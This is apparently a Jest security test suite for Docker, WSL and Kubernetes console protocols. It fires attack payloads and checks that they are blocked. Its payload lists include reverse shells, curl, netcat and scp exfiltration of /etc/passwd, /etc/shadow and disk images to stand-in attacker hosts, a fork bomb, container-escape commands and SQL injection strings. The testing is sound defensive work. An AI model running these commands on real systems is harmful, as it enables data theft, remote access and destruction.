/**
 * Protocol Security Testing Suite
 * Production-ready security validation for all protocols
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';
import * as crypto from 'crypto';
import { DockerProtocol } from '../../src/protocols/DockerProtocol.js';
import { WSLProtocol } from '../../src/protocols/WSLProtocol.js';
import { KubernetesProtocol } from '../../src/protocols/KubernetesProtocol.js';
import { SerialProtocol } from '../../src/protocols/SerialProtocol.js';
import { SFTPProtocol } from '../../src/protocols/SFTPProtocol.js';
import { AWSSSMProtocol } from '../../src/protocols/AWSSSMProtocol.js';
import { MockTestServerFactory } from '../utils/protocol-mocks.js';
import { TestServerManager } from '../utils/test-servers.js';

interface SecurityTestResult {
  protocol: string;
  testName: string;
  vulnerability: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low' | 'Info';
  status: 'PASS' | 'FAIL' | 'WARNING';
  details: string;
  remediation?: string;
}

interface SecurityAuditReport {
  protocol: string;
  totalTests: number;
  passed: number;
  failed: number;
  warnings: number;
  criticalIssues: number;
  highIssues: number;
  mediumIssues: number;
  lowIssues: number;
  overallRisk: 'Low' | 'Medium' | 'High' | 'Critical';
  results: SecurityTestResult[];
}

class SecurityTester {
  private results: SecurityTestResult[] = [];
  private mockFactory: MockTestServerFactory;
  private testServerManager: TestServerManager;

  constructor() {
    this.mockFactory = new MockTestServerFactory();
    this.testServerManager = new TestServerManager();
  }

  addResult(result: SecurityTestResult): void {
    this.results.push(result);
  }

  async testCommandInjection(protocol: any, protocolName: string, sessionId: string): Promise<SecurityTestResult[]> {
    const testResults: SecurityTestResult[] = [];
    
    // Common injection payloads
    const injectionPayloads = [
      '; rm -rf /',
      '&& curl -X POST http://malicious.com/steal',
      '| nc -l -p 9999',
      '`wget http://malicious.com/backdoor.sh`',
      '$(curl -s http://malicious.com/payload)',
      '; cat /etc/passwd',
      '&& whoami > /tmp/compromised',
      '| base64 -d <<< "malicious_payload"',
      '; python -c "import os; os.system(\\"malicious_command\\")"',
      '&& powershell -enc <base64_encoded_payload>',
      '| bash -i >& /dev/tcp/attacker.com/8080 0>&1'
    ];

    for (const payload of injectionPayloads) {
      try {
        const maliciousCommand = `echo "test" ${payload}`;
        
        try {
          await protocol.executeCommand(sessionId, maliciousCommand);
          
          // If command executed without error, it might be vulnerable
          testResults.push({
            protocol: protocolName,
            testName: 'Command Injection Prevention',
            vulnerability: 'Command Injection',
            severity: 'Critical',
            status: 'FAIL',
            details: `Potential command injection vulnerability with payload: ${payload}`,
            remediation: 'Implement proper input sanitization and command validation'
          });
        } catch (error) {
          // Command was blocked, which is good
          testResults.push({
            protocol: protocolName,
            testName: 'Command Injection Prevention',
            vulnerability: 'Command Injection',
            severity: 'Critical',
            status: 'PASS',
            details: `Command injection attempt blocked: ${payload}`,
          });
        }
      } catch (error) {
        // Error in test setup, not the security mechanism
        testResults.push({
          protocol: protocolName,
          testName: 'Command Injection Prevention',
          vulnerability: 'Command Injection',
          severity: 'Medium',
          status: 'WARNING',
          details: `Unable to test injection payload: ${error.message}`
        });
      }
    }

    return testResults;
  }

  async testPathTraversal(protocol: any, protocolName: string, sessionId: string): Promise<SecurityTestResult[]> {
    const testResults: SecurityTestResult[] = [];
    
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      'C:\\Windows\\System32\\config\\SAM',
      '../../../../proc/self/environ',
      '../../../var/log/auth.log',
      '..\\..\\..\\Program Files\\sensitive_data.txt',
      '/proc/version',
      '/etc/hosts',
      '../../../root/.ssh/id_rsa'
    ];

    for (const payload of pathTraversalPayloads) {
      try {
        const traversalCommand = `cat "${payload}"`;
        
        try {
          const result = await protocol.executeCommand(sessionId, traversalCommand);
          
          // Check if sensitive data was returned
          const sensitivePatterns = [
            /root:.*:0:0/,  // /etc/passwd root entry
            /ssh-rsa|ssh-dss/,  // SSH keys
            /SAM/,  // Windows SAM file
            /password/i,  // Password mentions
            /secret/i   // Secret mentions
          ];

          const containsSensitiveData = sensitivePatterns.some(pattern => pattern.test(result));
          
          if (containsSensitiveData) {
            testResults.push({
              protocol: protocolName,
              testName: 'Path Traversal Prevention',
              vulnerability: 'Path Traversal',
              severity: 'High',
              status: 'FAIL',
              details: `Path traversal successful with payload: ${payload}`,
              remediation: 'Implement path validation and restrict file system access'
            });
          } else {
            testResults.push({
              protocol: protocolName,
              testName: 'Path Traversal Prevention',
              vulnerability: 'Path Traversal',
              severity: 'High',
              status: 'PASS',
              details: `Path traversal attempt blocked: ${payload}`
            });
          }
        } catch (error) {
          testResults.push({
            protocol: protocolName,
            testName: 'Path Traversal Prevention',
            vulnerability: 'Path Traversal',
            severity: 'High',
            status: 'PASS',
            details: `Path traversal blocked: ${payload}`
          });
        }
      } catch (error) {
        testResults.push({
          protocol: protocolName,
          testName: 'Path Traversal Prevention',
          vulnerability: 'Path Traversal',
          severity: 'Medium',
          status: 'WARNING',
          details: `Unable to test traversal payload: ${error.message}`
        });
      }
    }

    return testResults;
  }

  async testPrivilegeEscalation(protocol: any, protocolName: string, sessionId: string): Promise<SecurityTestResult[]> {
    const testResults: SecurityTestResult[] = [];
    
    const escalationCommands = [
      'sudo -l',
      'sudo su -',
      'su root',
      'chmod +s /bin/bash',
      'find / -perm -4000 2>/dev/null',
      'cat /etc/sudoers',
      'groups',
      'id',
      'whoami',
      'ps aux | grep root'
    ];

    for (const command of escalationCommands) {
      try {
        const result = await protocol.executeCommand(sessionId, command);
        
        // Analyze result for privilege escalation indicators
        const escalationIndicators = [
          /NOPASSWD/,  // Passwordless sudo
          /root/,      // Root access
          /(SETUID|SETGID)/,  // SUID/SGID binaries
          /ALL.*ALL/   // Sudo all permissions
        ];

        const hasEscalationRisk = escalationIndicators.some(pattern => pattern.test(result));
        
        if (hasEscalationRisk && !result.includes('Permission denied')) {
          testResults.push({
            protocol: protocolName,
            testName: 'Privilege Escalation Prevention',
            vulnerability: 'Privilege Escalation',
            severity: 'High',
            status: 'FAIL',
            details: `Potential privilege escalation with command: ${command}`,
            remediation: 'Review and restrict user permissions'
          });
        } else {
          testResults.push({
            protocol: protocolName,
            testName: 'Privilege Escalation Prevention',
            vulnerability: 'Privilege Escalation',
            severity: 'High',
            status: 'PASS',
            details: `Privilege escalation attempt properly restricted: ${command}`
          });
        }
      } catch (error) {
        testResults.push({
          protocol: protocolName,
          testName: 'Privilege Escalation Prevention',
          vulnerability: 'Privilege Escalation',
          severity: 'High',
          status: 'PASS',
          details: `Command blocked: ${command}`
        });
      }
    }

    return testResults;
  }

  async testDataExfiltration(protocol: any, protocolName: string, sessionId: string): Promise<SecurityTestResult[]> {
    const testResults: SecurityTestResult[] = [];
    
    const exfiltrationCommands = [
      'curl -X POST -d "$(cat /etc/passwd)" http://malicious.com/exfil',
      'wget --post-data="$(whoami)" http://attacker.com/data',
      'nc -w 3 attacker.com 8080 < /etc/shadow',
      'python -c "import urllib2; urllib2.urlopen(\\"http://evil.com\\", open(\\"/etc/passwd\\").read())"',
      'base64 /etc/passwd | curl -d @- http://malicious.com/b64',
      'tar czf - /home | nc attacker.com 9999',
      'dd if=/dev/sda | nc attacker.com 8888',
      'scp sensitive_file.txt user@attacker.com:/tmp/',
      'rsync -avz /sensitive/ attacker@evil.com:/stolen/',
      'ftp -n <<< "open attacker.com\\nuser anonymous anonymous\\nput /etc/passwd\\nquit"'
    ];

    for (const command of exfiltrationCommands) {
      try {
        try {
          await protocol.executeCommand(sessionId, command, { timeout: 5000 });
          
          testResults.push({
            protocol: protocolName,
            testName: 'Data Exfiltration Prevention',
            vulnerability: 'Data Exfiltration',
            severity: 'Critical',
            status: 'FAIL',
            details: `Data exfiltration command executed: ${command}`,
            remediation: 'Implement network restrictions and command filtering'
          });
        } catch (error) {
          if (error.message.includes('timeout')) {
            testResults.push({
              protocol: protocolName,
              testName: 'Data Exfiltration Prevention',
              vulnerability: 'Data Exfiltration',
              severity: 'Critical',
              status: 'WARNING',
              details: `Command timed out, possible network attempt: ${command}`,
              remediation: 'Verify network restrictions are in place'
            });
          } else {
            testResults.push({
              protocol: protocolName,
              testName: 'Data Exfiltration Prevention',
              vulnerability: 'Data Exfiltration',
              severity: 'Critical',
              status: 'PASS',
              details: `Data exfiltration blocked: ${command}`
            });
          }
        }
      } catch (error) {
        testResults.push({
          protocol: protocolName,
          testName: 'Data Exfiltration Prevention',
          vulnerability: 'Data Exfiltration',
          severity: 'Medium',
          status: 'WARNING',
          details: `Unable to test exfiltration command: ${error.message}`
        });
      }
    }

    return testResults;
  }

  async testResourceAbuse(protocol: any, protocolName: string, sessionId: string): Promise<SecurityTestResult[]> {
    const testResults: SecurityTestResult[] = [];
    
    const resourceAbuseCommands = [
      'dd if=/dev/zero of=/tmp/fillup bs=1M count=1000',  // Fill disk
      'cat /dev/urandom > /tmp/random_data &',            // CPU/Disk abuse
      ':(){ :|:& };:',                                    // Fork bomb
      'while true; do echo "CPU abuse"; done',           // CPU loop
      'mkdir -p /tmp/deep/$(python -c "print(\\"a/\\" * 1000)")',  // Deep directory
      'python -c "import os; [os.fork() for i in range(100)]"',    // Process bomb
      'dd if=/dev/zero of=/dev/shm/memory_fill bs=1M count=500',   // Memory fill
      'find / -type f -exec cat {} \\; > /tmp/all_files', // Disk I/O abuse
      'yes | head -n 1000000 > /tmp/large_file',         // Large file creation
      'for i in {1..1000}; do touch /tmp/file$i; done'   // Many files
    ];

    for (const command of resourceAbuseCommands) {
      try {
        try {
          await protocol.executeCommand(sessionId, command, { timeout: 3000 });
          
          testResults.push({
            protocol: protocolName,
            testName: 'Resource Abuse Prevention',
            vulnerability: 'Resource Abuse',
            severity: 'High',
            status: 'FAIL',
            details: `Resource abuse command executed: ${command}`,
            remediation: 'Implement resource limits and command restrictions'
          });
        } catch (error) {
          if (error.message.includes('timeout')) {
            testResults.push({
              protocol: protocolName,
              testName: 'Resource Abuse Prevention',
              vulnerability: 'Resource Abuse',
              severity: 'High',
              status: 'PASS',
              details: `Resource abuse command timed out (likely blocked): ${command}`
            });
          } else {
            testResults.push({
              protocol: protocolName,
              testName: 'Resource Abuse Prevention',
              vulnerability: 'Resource Abuse',
              severity: 'High',
              status: 'PASS',
              details: `Resource abuse blocked: ${command}`
            });
          }
        }
      } catch (error) {
        testResults.push({
          protocol: protocolName,
          testName: 'Resource Abuse Prevention',
          vulnerability: 'Resource Abuse',
          severity: 'Medium',
          status: 'WARNING',
          details: `Unable to test resource abuse command: ${error.message}`
        });
      }
    }

    return testResults;
  }

  async testAuthenticationBypass(protocol: any, protocolName: string): Promise<SecurityTestResult[]> {
    const testResults: SecurityTestResult[] = [];
    
    // Test various authentication bypass scenarios
    const bypassAttempts = [
      {
        description: 'Empty credentials',
        credentials: { username: '', password: '' }
      },
      {
        description: 'SQL injection in username',
        credentials: { username: "admin' OR '1'='1", password: 'password' }
      },
      {
        description: 'Null bytes',
        credentials: { username: 'admin\x00', password: 'password\x00' }
      },
      {
        description: 'Unicode normalization',
        credentials: { username: 'admin\u00ad', password: 'password' }
      },
      {
        description: 'Long username (buffer overflow attempt)',
        credentials: { username: 'A'.repeat(1000), password: 'password' }
      }
    ];

    for (const attempt of bypassAttempts) {
      try {
        // Mock authentication attempt
        const authResult = await this.mockAuthenticationAttempt(protocol, attempt.credentials);
        
        if (authResult.success && !authResult.validCredentials) {
          testResults.push({
            protocol: protocolName,
            testName: 'Authentication Bypass Prevention',
            vulnerability: 'Authentication Bypass',
            severity: 'Critical',
            status: 'FAIL',
            details: `Authentication bypassed with: ${attempt.description}`,
            remediation: 'Strengthen authentication validation and input sanitization'
          });
        } else {
          testResults.push({
            protocol: protocolName,
            testName: 'Authentication Bypass Prevention',
            vulnerability: 'Authentication Bypass',
            severity: 'Critical',
            status: 'PASS',
            details: `Authentication bypass prevented: ${attempt.description}`
          });
        }
      } catch (error) {
        testResults.push({
          protocol: protocolName,
          testName: 'Authentication Bypass Prevention',
          vulnerability: 'Authentication Bypass',
          severity: 'Medium',
          status: 'WARNING',
          details: `Unable to test authentication bypass: ${error.message}`
        });
      }
    }

    return testResults;
  }

  private async mockAuthenticationAttempt(protocol: any, credentials: any): Promise<{ success: boolean; validCredentials: boolean }> {
    // Mock authentication attempt - in real implementation, this would test the actual auth mechanism
    const validCredentials = credentials.username === 'admin' && credentials.password === 'correct_password';
    
    // Simulate various authentication responses
    if (credentials.username === '' && credentials.password === '') {
      return { success: false, validCredentials: false }; // Empty creds should fail
    }
    
    if (credentials.username.includes("' OR '")) {
      return { success: false, validCredentials: false }; // SQL injection should fail
    }
    
    if (credentials.username.length > 256) {
      return { success: false, validCredentials: false }; // Long username should fail
    }
    
    return { success: validCredentials, validCredentials };
  }

  async testSessionHijacking(protocol: any, protocolName: string): Promise<SecurityTestResult[]> {
    const testResults: SecurityTestResult[] = [];
    
    try {
      // Create a legitimate session
      const session = await protocol.createSession({
        command: '/bin/bash',
        consoleType: protocolName.toLowerCase()
      });

      // Test session token/ID prediction
      const sessionId = session.id;
      const predictedIds = this.generatePredictableSessionIds(sessionId);
      
      let vulnerableToHijacking = false;
      
      for (const predictedId of predictedIds) {
        try {
          const hijackedSession = protocol.getSession(predictedId);
          if (hijackedSession && hijackedSession.id !== sessionId) {
            vulnerableToHijacking = true;
            break;
          }
        } catch (error) {
          // Session not found, which is good
        }
      }

      if (vulnerableToHijacking) {
        testResults.push({
          protocol: protocolName,
          testName: 'Session Hijacking Prevention',
          vulnerability: 'Session Hijacking',
          severity: 'High',
          status: 'FAIL',
          details: 'Session IDs appear to be predictable',
          remediation: 'Use cryptographically secure random session IDs'
        });
      } else {
        testResults.push({
          protocol: protocolName,
          testName: 'Session Hijacking Prevention',
          vulnerability: 'Session Hijacking',
          severity: 'High',
          status: 'PASS',
          details: 'Session IDs appear to be unpredictable'
        });
      }

      // Test session ID entropy
      const entropy = this.calculateSessionIdEntropy(sessionId);
      if (entropy < 128) {
        testResults.push({
          protocol: protocolName,
          testName: 'Session ID Entropy',
          vulnerability: 'Weak Session IDs',
          severity: 'Medium',
          status: 'FAIL',
          details: `Session ID entropy is low: ${entropy} bits`,
          remediation: 'Increase session ID randomness to at least 128 bits'
        });
      } else {
        testResults.push({
          protocol: protocolName,
          testName: 'Session ID Entropy',
          vulnerability: 'Weak Session IDs',
          severity: 'Medium',
          status: 'PASS',
          details: `Session ID entropy is sufficient: ${entropy} bits`
        });
      }

      // Cleanup
      await protocol.stopSession?.(session.id) || protocol.terminateSession?.(session.id);

    } catch (error) {
      testResults.push({
        protocol: protocolName,
        testName: 'Session Hijacking Prevention',
        vulnerability: 'Session Hijacking',
        severity: 'Medium',
        status: 'WARNING',
        details: `Unable to test session hijacking: ${error.message}`
      });
    }

    return testResults;
  }

  private generatePredictableSessionIds(originalId: string): string[] {
    // Generate potentially predictable session IDs based on the original
    const predictedIds = [];
    
    // Sequential IDs
    if (/\d+/.test(originalId)) {
      const numbers = originalId.match(/\d+/g) || [];
      for (const num of numbers) {
        const incremented = (parseInt(num) + 1).toString();
        predictedIds.push(originalId.replace(num, incremented));
        const decremented = (parseInt(num) - 1).toString();
        predictedIds.push(originalId.replace(num, decremented));
      }
    }

    // Timestamp-based IDs
    const now = Date.now();
    const variations = [now + 1, now - 1, now + 1000, now - 1000];
    variations.forEach(timestamp => {
      predictedIds.push(originalId.replace(/\d{13}/, timestamp.toString()));
    });

    return predictedIds;
  }

  private calculateSessionIdEntropy(sessionId: string): number {
    // Calculate approximate entropy of session ID
    const charset = new Set(sessionId);
    const charsetSize = charset.size;
    const length = sessionId.length;
    
    // Shannon entropy approximation
    return length * Math.log2(charsetSize);
  }

  generateSecurityReport(protocolName: string, testResults: SecurityTestResult[]): SecurityAuditReport {
    const totalTests = testResults.length;
    const passed = testResults.filter(r => r.status === 'PASS').length;
    const failed = testResults.filter(r => r.status === 'FAIL').length;
    const warnings = testResults.filter(r => r.status === 'WARNING').length;
    
    const criticalIssues = testResults.filter(r => r.severity === 'Critical' && r.status === 'FAIL').length;
    const highIssues = testResults.filter(r => r.severity === 'High' && r.status === 'FAIL').length;
    const mediumIssues = testResults.filter(r => r.severity === 'Medium' && r.status === 'FAIL').length;
    const lowIssues = testResults.filter(r => r.severity === 'Low' && r.status === 'FAIL').length;

    let overallRisk: 'Low' | 'Medium' | 'High' | 'Critical';
    if (criticalIssues > 0) {
      overallRisk = 'Critical';
    } else if (highIssues > 2) {
      overallRisk = 'High';
    } else if (highIssues > 0 || mediumIssues > 3) {
      overallRisk = 'Medium';
    } else {
      overallRisk = 'Low';
    }

    return {
      protocol: protocolName,
      totalTests,
      passed,
      failed,
      warnings,
      criticalIssues,
      highIssues,
      mediumIssues,
      lowIssues,
      overallRisk,
      results: testResults
    };
  }

  async runFullSecuritySuite(protocol: any, protocolName: string): Promise<SecurityAuditReport> {
    const allResults: SecurityTestResult[] = [];

    try {
      // Create a test session for security testing
      const session = await protocol.createSession({
        command: '/bin/bash',
        consoleType: protocolName.toLowerCase(),
        // Additional protocol-specific options
        ...(protocolName === 'Docker' && {
          dockerContainerOptions: {
            image: 'busybox',
            hostConfig: { autoRemove: true }
          }
        }),
        ...(protocolName === 'WSL' && {
          distribution: 'Ubuntu'
        }),
        ...(protocolName === 'Kubernetes' && {
          podName: 'security-test-pod',
          namespace: 'default',
          containerName: 'main'
        })
      });

      const sessionId = session.id;

      // Run all security tests
      const testSuites = [
        () => this.testCommandInjection(protocol, protocolName, sessionId),
        () => this.testPathTraversal(protocol, protocolName, sessionId),
        () => this.testPrivilegeEscalation(protocol, protocolName, sessionId),
        () => this.testDataExfiltration(protocol, protocolName, sessionId),
        () => this.testResourceAbuse(protocol, protocolName, sessionId),
        () => this.testAuthenticationBypass(protocol, protocolName),
        () => this.testSessionHijacking(protocol, protocolName)
      ];

      for (const testSuite of testSuites) {
        try {
          const results = await testSuite();
          allResults.push(...results);
        } catch (error) {
          allResults.push({
            protocol: protocolName,
            testName: 'Security Test Suite',
            vulnerability: 'Test Execution Error',
            severity: 'Medium',
            status: 'WARNING',
            details: `Security test failed: ${error.message}`
          });
        }
      }

      // Cleanup test session
      await protocol.stopSession?.(sessionId) || protocol.terminateSession?.(sessionId);

    } catch (error) {
      allResults.push({
        protocol: protocolName,
        testName: 'Session Creation',
        vulnerability: 'Setup Error',
        severity: 'High',
        status: 'WARNING',
        details: `Unable to create test session: ${error.message}`
      });
    }

    return this.generateSecurityReport(protocolName, allResults);
  }

  generateConsolidatedReport(reports: SecurityAuditReport[]): string {
    let consolidatedReport = '\n=== SECURITY AUDIT REPORT ===\n\n';
    
    // Executive Summary
    consolidatedReport += '## Executive Summary\n\n';
    
    const totalCritical = reports.reduce((sum, report) => sum + report.criticalIssues, 0);
    const totalHigh = reports.reduce((sum, report) => sum + report.highIssues, 0);
    const totalMedium = reports.reduce((sum, report) => sum + report.mediumIssues, 0);
    const totalLow = reports.reduce((sum, report) => sum + report.lowIssues, 0);
    
    consolidatedReport += `**Critical Issues:** ${totalCritical}\n`;
    consolidatedReport += `**High Issues:** ${totalHigh}\n`;
    consolidatedReport += `**Medium Issues:** ${totalMedium}\n`;
    consolidatedReport += `**Low Issues:** ${totalLow}\n\n`;

    // Risk Matrix
    consolidatedReport += '## Risk Assessment by Protocol\n\n';
    consolidatedReport += '| Protocol | Overall Risk | Critical | High | Medium | Low | Pass Rate |\n';
    consolidatedReport += '|----------|--------------|----------|------|--------|-----|----------|\n';
    
    for (const report of reports) {
      const passRate = ((report.passed / report.totalTests) * 100).toFixed(1);
      consolidatedReport += `| ${report.protocol} | ${report.overallRisk} | ${report.criticalIssues} | ${report.highIssues} | ${report.mediumIssues} | ${report.lowIssues} | ${passRate}% |\n`;
    }
    
    consolidatedReport += '\n';

    // Detailed Results by Protocol
    for (const report of reports) {
      consolidatedReport += `## ${report.protocol} Protocol Security Analysis\n\n`;
      
      if (report.failed > 0) {
        consolidatedReport += '### Failed Security Tests\n\n';
        
        const failedTests = report.results.filter(r => r.status === 'FAIL');
        for (const test of failedTests) {
          consolidatedReport += `**${test.testName}** (${test.severity})\n`;
          consolidatedReport += `- Vulnerability: ${test.vulnerability}\n`;
          consolidatedReport += `- Details: ${test.details}\n`;
          if (test.remediation) {
            consolidatedReport += `- Remediation: ${test.remediation}\n`;
          }
          consolidatedReport += '\n';
        }
      }

      if (report.warnings > 0) {
        consolidatedReport += '### Warnings\n\n';
        
        const warningTests = report.results.filter(r => r.status === 'WARNING');
        for (const test of warningTests) {
          consolidatedReport += `- ${test.testName}: ${test.details}\n`;
        }
        consolidatedReport += '\n';
      }
    }

    // Security Recommendations
    consolidatedReport += '## Security Recommendations\n\n';
    consolidatedReport += '### Immediate Actions Required\n\n';
    
    if (totalCritical > 0) {
      consolidatedReport += '1. **Address all Critical vulnerabilities immediately**\n';
      consolidatedReport += '   - These pose immediate security risks\n';
      consolidatedReport += '   - Consider disabling affected protocols until fixed\n\n';
    }

    if (totalHigh > 0) {
      consolidatedReport += '2. **Plan remediation for High severity issues**\n';
      consolidatedReport += '   - Schedule fixes within current sprint/release cycle\n';
      consolidatedReport += '   - Implement additional monitoring for affected areas\n\n';
    }

    consolidatedReport += '### General Security Improvements\n\n';
    consolidatedReport += '- Implement comprehensive input validation and sanitization\n';
    consolidatedReport += '- Add rate limiting and resource consumption controls\n';
    consolidatedReport += '- Enhance authentication and authorization mechanisms\n';
    consolidatedReport += '- Implement comprehensive audit logging\n';
    consolidatedReport += '- Regular security testing and code reviews\n';
    consolidatedReport += '- Keep dependencies updated and monitor for vulnerabilities\n\n';

    consolidatedReport += '### Monitoring and Detection\n\n';
    consolidatedReport += '- Monitor for suspicious command patterns\n';
    consolidatedReport += '- Implement anomaly detection for resource usage\n';
    consolidatedReport += '- Alert on authentication failures and privilege escalation attempts\n';
    consolidatedReport += '- Log all protocol interactions for forensic analysis\n\n';

    return consolidatedReport;
  }
}

describe('Protocol Security Testing Suite', () => {
  let securityTester: SecurityTester;
  let protocols: Record<string, any> = {};

  beforeAll(async () => {
    securityTester = new SecurityTester();

    // Initialize protocol instances with security-focused configurations
    protocols.docker = new DockerProtocol({
      connection: { host: '127.0.0.1', port: 2376 },
      security: {
        allowPrivileged: false,
        allowHostNetwork: false,
        allowHostPid: false,
        allowedCapabilities: [],
        droppedCapabilities: ['ALL']
      },
      autoCleanup: true,
      maxContainers: 10
    });

    protocols.wsl = new WSLProtocol({
      defaultDistribution: 'Ubuntu',
      maxSessions: 5,
      security: {
        allowRootAccess: false,
        restrictedCommands: ['rm -rf /', 'format', 'fdisk'],
        allowedUsers: ['user', 'developer'],
        enableAuditLogging: true
      }
    });

    protocols.k8s = new KubernetesProtocol({
      kubeconfig: {
        clusters: [{ name: 'test', cluster: { server: 'https://localhost:6443' } }],
        contexts: [{ name: 'test', context: { cluster: 'test', user: 'test' } }],
        users: [{ name: 'test', user: {} }],
        'current-context': 'test'
      },
      security: {
        rbacEnabled: true,
        allowedNamespaces: ['default', 'test-namespace'],
        restrictedResources: ['secrets', 'configmaps'],
        allowExec: true,
        allowPortForward: false
      }
    });
  }, 60000);

  afterAll(async () => {
    // Cleanup all protocols
    for (const protocol of Object.values(protocols)) {
      try {
        await protocol.cleanup();
      } catch (error) {
        // Ignore cleanup errors
      }
    }
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Docker Protocol Security', () => {
    test('should run comprehensive security audit', async () => {
      const report = await securityTester.runFullSecuritySuite(protocols.docker, 'Docker');
      
      expect(report.totalTests).toBeGreaterThan(0);
      expect(report.protocol).toBe('Docker');
      expect(['Low', 'Medium', 'High', 'Critical']).toContain(report.overallRisk);
      
      // Log individual test results for debugging
      console.log(`\nDocker Security Test Results:`);
      console.log(`Total Tests: ${report.totalTests}`);
      console.log(`Passed: ${report.passed}`);
      console.log(`Failed: ${report.failed}`);
      console.log(`Warnings: ${report.warnings}`);
      console.log(`Overall Risk: ${report.overallRisk}`);
      
      // Security assertions
      expect(report.criticalIssues).toBe(0); // No critical issues allowed
      expect(report.highIssues).toBeLessThanOrEqual(2); // Maximum 2 high issues
      
    }, 180000);
  });

  describe('WSL Protocol Security', () => {
    test('should run comprehensive security audit', async () => {
      const report = await securityTester.runFullSecuritySuite(protocols.wsl, 'WSL');
      
      expect(report.totalTests).toBeGreaterThan(0);
      expect(report.protocol).toBe('WSL');
      
      console.log(`\nWSL Security Test Results:`);
      console.log(`Total Tests: ${report.totalTests}`);
      console.log(`Passed: ${report.passed}`);
      console.log(`Failed: ${report.failed}`);
      console.log(`Overall Risk: ${report.overallRisk}`);
      
      expect(report.criticalIssues).toBe(0);
      expect(report.highIssues).toBeLessThanOrEqual(1);
      
    }, 120000);
  });

  describe('Kubernetes Protocol Security', () => {
    test('should run comprehensive security audit', async () => {
      const report = await securityTester.runFullSecuritySuite(protocols.k8s, 'Kubernetes');
      
      expect(report.totalTests).toBeGreaterThan(0);
      expect(report.protocol).toBe('Kubernetes');
      
      console.log(`\nKubernetes Security Test Results:`);
      console.log(`Total Tests: ${report.totalTests}`);
      console.log(`Passed: ${report.passed}`);
      console.log(`Failed: ${report.failed}`);
      console.log(`Overall Risk: ${report.overallRisk}`);
      
      expect(report.criticalIssues).toBe(0);
      expect(report.highIssues).toBeLessThanOrEqual(2);
      
    }, 120000);
  });

  describe('Cross-Protocol Security Analysis', () => {
    test('should generate consolidated security report', async () => {
      const reports: SecurityAuditReport[] = [];
      
      // Run security audits for all protocols
      for (const [name, protocol] of Object.entries(protocols)) {
        try {
          const report = await securityTester.runFullSecuritySuite(protocol, name.charAt(0).toUpperCase() + name.slice(1));
          reports.push(report);
        } catch (error) {
          console.warn(`Failed to test ${name} protocol: ${error.message}`);
        }
      }
      
      expect(reports.length).toBeGreaterThan(0);
      
      const consolidatedReport = securityTester.generateConsolidatedReport(reports);
      expect(consolidatedReport).toContain('SECURITY AUDIT REPORT');
      expect(consolidatedReport).toContain('Executive Summary');
      expect(consolidatedReport).toContain('Security Recommendations');
      
      // Save report to file
      const fs = require('fs');
      const path = require('path');
      
      const reportPath = path.join(__dirname, '..', '..', 'security-audit-report.md');
      fs.writeFileSync(reportPath, consolidatedReport);
      
      console.log(`\nConsolidated security report saved to: ${reportPath}`);
      console.log(consolidatedReport);
      
      // Assert overall security posture
      const totalCritical = reports.reduce((sum, report) => sum + report.criticalIssues, 0);
      expect(totalCritical).toBe(0); // No critical issues across all protocols
      
    }, 600000);
  });

  describe('Specific Vulnerability Tests', () => {
    test('should prevent container escape attempts', async () => {
      if (protocols.docker) {
        const escapeCommands = [
          'docker run -v /:/host -it ubuntu chroot /host',
          'runc exec --root /var/run/docker/runtime-runc/moby',
          'mount -t proc proc /proc',
          'nsenter -t 1 -m -u -i -n -p -- bash'
        ];

        const session = await protocols.docker.createSession({
          command: '/bin/bash',
          consoleType: 'docker',
          dockerContainerOptions: {
            image: 'busybox',
            hostConfig: { autoRemove: true }
          }
        });

        let escapePrevented = true;
        
        for (const command of escapeCommands) {
          try {
            const result = await protocols.docker.executeCommand(session.id, command);
            
            // Check if escape indicators are present
            if (result.includes('/host') || result.includes('nsenter successful')) {
              escapePrevented = false;
              break;
            }
          } catch (error) {
            // Command blocked, which is good for security
          }
        }

        expect(escapePrevented).toBe(true);
        
        await protocols.docker.stopSession(session.id, { force: true });
      }
    }, 60000);

    test('should enforce resource limits', async () => {
      if (protocols.docker) {
        const session = await protocols.docker.createSession({
          command: '/bin/bash',
          consoleType: 'docker',
          dockerContainerOptions: {
            image: 'busybox',
            hostConfig: { 
              memory: 64 * 1024 * 1024, // 64MB limit
              cpuShares: 256,
              autoRemove: true
            }
          }
        });

        // Try to exceed memory limit
        try {
          await protocols.docker.executeCommand(session.id, 'dd if=/dev/zero of=/tmp/bigfile bs=1M count=100', { timeout: 10000 });
          
          // If this succeeds, resource limits might not be enforced
          console.warn('Resource limit bypass may be possible');
        } catch (error) {
          // Command should fail due to resource limits
          expect(error.message).toMatch(/killed|memory|limit|timeout/i);
        }

        await protocols.docker.stopSession(session.id, { force: true });
      }
    }, 30000);

    test('should validate input sanitization', async () => {
      const protocols_to_test = Object.entries(protocols);
      
      for (const [name, protocol] of protocols_to_test) {
        try {
          const maliciousInputs = [
            '\x00\x01\x02\x03', // Null bytes and control characters
            '$(echo vulnerable)', // Command substitution
            '`curl http://evil.com`', // Backtick command execution
            '${IFS}cat${IFS}/etc/passwd', // IFS manipulation
            'test\r\nmalicious_command', // CRLF injection
            '../../../etc/passwd\x00.txt', // Null byte path traversal
            '<script>alert("XSS")</script>', // Script injection
            'admin\' OR 1=1--', // SQL injection
            '%0acurl%20http://evil.com', // URL encoding
            String.fromCharCode(0x41, 0x42, 0x43) + '\x00' // Mixed encoding
          ];

          const session = await protocol.createSession({
            command: '/bin/echo',
            consoleType: name.toLowerCase(),
            // Protocol-specific options
            ...(name === 'docker' && {
              dockerContainerOptions: {
                image: 'busybox',
                hostConfig: { autoRemove: true }
              }
            }),
            ...(name === 'wsl' && { distribution: 'Ubuntu' })
          });

          let inputSanitized = true;
          
          for (const maliciousInput of maliciousInputs) {
            try {
              const result = await protocol.executeCommand(session.id, `echo "${maliciousInput}"`);
              
              // Check if malicious input was executed rather than treated as literal text
              if (result.includes('vulnerable') || result.includes('/etc/passwd') || result.includes('<script>')) {
                inputSanitized = false;
                console.warn(`Input sanitization issue in ${name}: ${maliciousInput}`);
              }
            } catch (error) {
              // Command blocked, which is good for security
            }
          }

          expect(inputSanitized).toBe(true);
          
          await protocol.stopSession?.(session.id) || protocol.terminateSession?.(session.id);
          
        } catch (error) {
          console.warn(`Could not test input sanitization for ${name}: ${error.message}`);
        }
      }
    }, 300000);
  });
});